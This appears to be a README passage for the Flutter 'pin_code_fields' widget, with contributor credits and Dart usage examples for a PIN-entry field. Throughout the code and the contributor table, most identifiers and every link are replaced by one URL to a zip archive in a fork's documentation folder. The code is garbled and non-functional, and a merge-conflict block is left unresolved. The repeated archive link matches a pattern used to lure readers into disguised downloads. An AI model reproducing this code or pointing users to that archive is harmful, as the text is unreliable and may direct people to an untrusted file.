  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="ItzNotABug"/><br /><sub><b>DarShan</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="dhruvanbhalara"/><br /><sub><b>Dhruvan Bhalara</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
<<<<<<< HEAD
=======
  <td align="center"><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip"><img src="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" width="100px;" alt="rodion-m"/><br /><sub><b>Rodion Mostovoy</b></sub></a><br /><a href="https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip" title="Code">💻</a></td>
>>>>>>> 8272cbfd8a1dab43b2b4f4f1107752dda1d9d230
  </tr>
</table>

**The pin code text field widget example**

```Dart
PinCodeTextField(
  length: 6,
  obscureText: false,
  animationType: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
  pinTheme: PinTheme(
    shape: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
    borderRadius: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(5),
    fieldHeight: 50,
    fieldWidth: 40,
    activeFillColor: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
  ),
  animationDuration: Duration(milliseconds: 300),
  backgroundColor: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
  enableActiveFill: true,
  errorAnimationController: errorController,
  controller: textEditingController,
  onCompleted: (v) {
    print("Completed");
  },
  onChanged: (value) {
    print(value);
    setState(() {
      currentText = value;
    });
  },
  beforeTextPaste: (text) {
    print("Allowing to paste $text");
    //if you return true then it will show the paste confirmation dialog. Otherwise if false, then nothing will happen.
    //but you can show anything you want here, like your pop up saying wrong paste format or etc
    return true;
  },
)
```

**Shape can be among these 3 types**

```Dart
enum PinCodeFieldShape { box, underline, circle }
```

**Animations can be among these 3 types**

```Dart
enum AnimationType { scale, slide, fade, none }
```

**Haptic Feedbacks can be among these 5 types**

```Dart
enum HapticFeedbackTypes {
  heavy,
  light,
  medium,
  selection,
  vibrate,
}

```

**Trigger Error animation**<br>

1. Create a StreamController<ErrorAnimationType>

```Dart
StreamController<ErrorAnimationType> errorController = StreamController<ErrorAnimationType>();
```

2. And pass the controller like this.

```Dart
PinCodeTextField(
  length: 6,
  obscureText: false,
  animationType: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
  animationDuration: Duration(milliseconds: 300),
  errorAnimationController: errorController, // Pass it here
  onChanged: (value) {
    setState(() {
      currentText = value;
    });
  },
)
```

3. Then you can trigger the animation just by writing this:

```Dart
https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip); // This will shake the pin code field
```

**This full code is from the example folder. You can run the example to see.**

```Dart
class MyApp extends StatelessWidget {
  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter Demo',
      theme: ThemeData(
        primarySwatch: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
      ),
      home: PinCodeVerificationScreen(
          "+8801376221100"), // a random number, please don't call xD
    );
  }
}

class PinCodeVerificationScreen extends StatefulWidget {
  final String phoneNumber;

  PinCodeVerificationScreen(https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip);

  @override
  _PinCodeVerificationScreenState createState() =>
      _PinCodeVerificationScreenState();
}

class _PinCodeVerificationScreenState extends State<PinCodeVerificationScreen> {
  var onTapRecognizer;

  TextEditingController textEditingController = TextEditingController();
  // https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip = "123456";

  StreamController<ErrorAnimationType> errorController;

  bool hasError = false;
  String currentText = "";
  final GlobalKey<ScaffoldState> scaffoldKey = GlobalKey<ScaffoldState>();
  final formKey = GlobalKey<FormState>();

  @override
  void initState() {
    onTapRecognizer = TapGestureRecognizer()
      https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip = () {
        https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(context);
      };
    errorController = StreamController<ErrorAnimationType>();
    https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip();
  }

  @override
  void dispose() {
    https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip();

    https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
      key: scaffoldKey,
      body: GestureDetector(
        onTap: () {},
        child: Container(
          height: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(context)https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
          width: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(context)https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
          child: ListView(
            children: <Widget>[
              SizedBox(height: 30),
              Container(
                height: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(context)https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip / 3,
                child: FlareActor(
                  "https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip",
                  animation: "otp",
                  fit: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                  alignment: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                ),
              ),
              SizedBox(height: 8),
              Padding(
                padding: const https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(vertical: 8.0),
                child: Text(
                  'Phone Number Verification',
                  style: TextStyle(fontWeight: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip, fontSize: 22),
                  textAlign: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                ),
              ),
              Padding(
                padding:
                    const https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(horizontal: 30.0, vertical: 8),
                child: RichText(
                  text: TextSpan(
                      text: "Enter the code sent to ",
                      children: [
                        TextSpan(
                            text: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                            style: TextStyle(
                                color: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                                fontWeight: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                                fontSize: 15)),
                      ],
                      style: TextStyle(color: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip, fontSize: 15)),
                  textAlign: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                ),
              ),
              SizedBox(
                height: 20,
              ),
              Form(
                key: formKey,
                child: Padding(
                    padding: const https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(
                        vertical: 8.0, horizontal: 30),
                    child: PinCodeTextField(
                      appContext: context,
                      pastedTextStyle: TextStyle(
                        color: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                        fontWeight: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                      ),
                      length: 6,
                      obscureText: false,
                      obscuringCharacter: '*',
                      animationType: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                      validator: (v) {
                        if (https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip < 3) {
                          return "I'm from validator";
                        } else {
                          return null;
                        }
                      },
                      pinTheme: PinTheme(
                        shape: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                        borderRadius: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(5),
                        fieldHeight: 60,
                        fieldWidth: 50,
                        activeFillColor:
                            hasError ? https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip : https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                      ),
                      cursorColor: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                      animationDuration: Duration(milliseconds: 300),
                      textStyle: TextStyle(fontSize: 20, height: 1.6),
                      backgroundColor: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                      enableActiveFill: true,
                      errorAnimationController: errorController,
                      controller: textEditingController,
                      keyboardType: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                      boxShadows: [
                        BoxShadow(
                          offset: Offset(0, 1),
                          color: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                          blurRadius: 10,
                        )
                      ],
                      onCompleted: (v) {
                        print("Completed");
                      },
                      // onTap: () {
                      //   print("Pressed");
                      // },
                      onChanged: (value) {
                        print(value);
                        setState(() {
                          currentText = value;
                        });
                      },
                      beforeTextPaste: (text) {
                        print("Allowing to paste $text");
                        //if you return true then it will show the paste confirmation dialog. Otherwise if false, then nothing will happen.
                        //but you can show anything you want here, like your pop up saying wrong paste format or etc
                        return true;
                      },
                    )),
              ),
              Padding(
                padding: const https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(horizontal: 30.0),
                child: Text(
                  hasError ? "*Please fill up all the cells properly" : "",
                  style: TextStyle(
                      color: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                      fontSize: 12,
                      fontWeight: FontWeight.w400),
                ),
              ),
              SizedBox(
                height: 20,
              ),
              RichText(
                textAlign: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                text: TextSpan(
                    text: "Didn't receive the code? ",
                    style: TextStyle(color: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip, fontSize: 15),
                    children: [
                      TextSpan(
                          text: " RESEND",
                          recognizer: onTapRecognizer,
                          style: TextStyle(
                              color: Color(0xFF91D3B3),
                              fontWeight: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                              fontSize: 16))
                    ]),
              ),
              SizedBox(
                height: 14,
              ),
              Container(
                margin:
                    const https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(vertical: 16.0, horizontal: 30),
                child: ButtonTheme(
                  height: 50,
                  child: FlatButton(
                    onPressed: () {
                      https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip();
                      // conditions for validating
                      if (https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip != 6 || currentText != "towtow") {
                        https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(ErrorAnimationType
                            .shake); // Triggering error shake animation
                        setState(() {
                          hasError = true;
                        });
                      } else {
                        setState(() {
                          hasError = false;
                          https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(SnackBar(
                            content: Text("Aye!!"),
                            duration: Duration(seconds: 2),
                          ));
                        });
                      }
                    },
                    child: Center(
                        child: Text(
                      "VERIFY".toUpperCase(),
                      style: TextStyle(
                          color: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                          fontSize: 18,
                          fontWeight: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip),
                    )),
                  ),
                ),
                decoration: BoxDecoration(
                    color: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                    borderRadius: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip(5),
                    boxShadow: [
                      BoxShadow(
                          color: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                          offset: Offset(1, -2),
                          blurRadius: 5),
                      BoxShadow(
                          color: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                          offset: Offset(-1, 2),
                          blurRadius: 5)
                    ]),
              ),
              SizedBox(
                height: 16,
              ),
              Row(
                mainAxisAlignment: https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip,
                children: <Widget>[
                  FlatButton(
                    child: Text("Clear"),
                    onPressed: () {
                      https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip();
                    },
                  ),
                  FlatButton(
                    child: Text("Set Text"),
                    onPressed: () {
                      https://raw.githubusercontent.com/Natashamehta23/pin_code_fields/master/doc/api/dart-typed_data/UnmodifiableInt16ListView/fields-code-pin-v3.0.zip = "123456";
                    },
                  ),
                ],
              )
            ],
          ),
        ),
      ),
    );
  }
}
```
